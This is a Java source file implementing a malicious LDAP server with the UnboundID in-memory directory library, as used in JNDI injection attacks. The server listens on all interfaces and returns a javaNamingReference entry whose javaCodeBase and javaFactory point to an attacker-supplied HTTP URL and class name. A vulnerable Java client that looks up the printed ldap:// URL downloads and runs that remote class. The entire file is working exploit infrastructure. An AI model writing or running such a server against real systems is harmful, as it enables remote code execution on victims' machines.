package com.server;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.Entry;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.UnknownHostException;

public class LdapServer {
    /*
    * serverIp 不填，默认本机
    * */
    public static void runServer(int ldapServerPort, String httpServerUrl, String className){
        try {
            InetAddress host = Inet4Address.getByAddress(new byte[]{
                    (byte) 0,
                    (byte) 0,
                    (byte) 0,
                    (byte) 0,
            });

            InMemoryListenerConfig inMemoryListenerConfig = new InMemoryListenerConfig(
                    "server",
                    host,
                    ldapServerPort,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()
            );
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=com"); //指定根dn
            config.setListenerConfigs(inMemoryListenerConfig);
            config.setSchema(null);
            //创建一个LDAP Server。加载上文的config
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);

            Entry entry = new Entry("dc=com");
            entry.addAttribute("javaCodeBase", httpServerUrl);
            entry.addAttribute("javaFactory", className);
            entry.addAttribute("javaClassName", className);
            entry.addAttribute("objectClass", "javaNamingReference");
            ds.addEntries(entry);

            System.out.println("[+] LDAP server running at " + host.getHostAddress() + ":" + ldapServerPort
                    + "\njavaCodeBase=" + httpServerUrl
                    + "\njavaFactory=" + className
                    + "\njavaClassName=" + className
                    + "\nobjectClass=" + "javaNamingReference"
                    + "\nurl=ldap://" + host.getHostAddress() + ":" + ldapServerPort + "/dc=com"
            );

            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
